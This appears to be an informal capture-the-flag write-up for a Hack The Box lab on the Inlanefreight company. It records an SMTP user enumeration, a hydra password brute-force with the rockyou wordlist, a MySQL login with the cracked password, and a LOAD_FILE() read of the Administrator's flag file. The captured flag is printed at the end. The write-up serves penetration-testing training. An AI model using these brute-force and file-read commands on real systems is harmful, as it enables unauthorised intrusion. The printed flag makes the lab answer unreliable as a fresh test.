We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. 
We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

HTB{...}
Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

okay so were going to be dealing with email services of some sort. so we will start out with the ol faithful nmap 

1) sudo nmap -sCV -A 10.129.192.90  -> oh boy...... 

Output :

so we have a lot to work with here.. 

2) tried to FTP with anonymous and hydra nad no luck 
3) move onto SMTP -> smtp-user-enum -M RCPT -U user.list -D inlanefreight.htb -t 10.129.192.90
4) 10.129.192.90: fiona@inlanefreight.htb exists
5) hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -t 64 -f 10.129.192.90 smtp
6) password is 987654321
7) mysql -u fiona -p987654321 -h 10.129.192.90
8) show databases;
9) show variables like "secure_file_priv";
9.a) This step is specific to determining whether the LOAD_FILE() function can be used effectively. The secure_file_priv variable specifies the directory (or directories) from which files can be loaded using functions like LOAD_FILE().
9.b) If this value is empty, files can be loaded from any location. If it has a specific path, you can only load files from that directory. Knowing this ensures your next step (LOAD_FILE()) is properly scoped.
10) SELECT LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt");
10.a) After confirming through secure_file_priv that file loading is possible and the directory allows access, this command attempts to read the contents of the flag.txt file on the target system.
10.b) You guessed correctly that flags in HTB are often stored in the Administrator user's Desktop directory.
11) HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
